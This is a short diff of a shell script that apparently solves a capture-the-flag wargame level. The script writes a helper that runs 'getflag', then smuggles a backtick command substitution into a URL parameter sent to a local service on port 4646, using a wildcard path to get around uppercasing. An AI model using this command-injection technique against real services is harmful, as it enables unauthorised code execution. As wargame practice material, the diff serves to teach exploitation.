@@ -11,9 +11,9 @@
 # file name and wildcards to access it
 # (/TMP/ not beeing a thing)
 
-echo '#!/bin/sh' > /tmp/WOW
-echo 'getflag > /tmp/flag' >> /tmp/WOW
+echo '#!/bin/sh'              > /tmp/WOW
+echo 'getflag > /tmp/flag12' >> /tmp/WOW
 chmod 754 /tmp/WOW
 curl 'http://localhost:4646/?x=`/*/WOW`'
-cat /tmp/flag
+cat /tmp/flag12
 
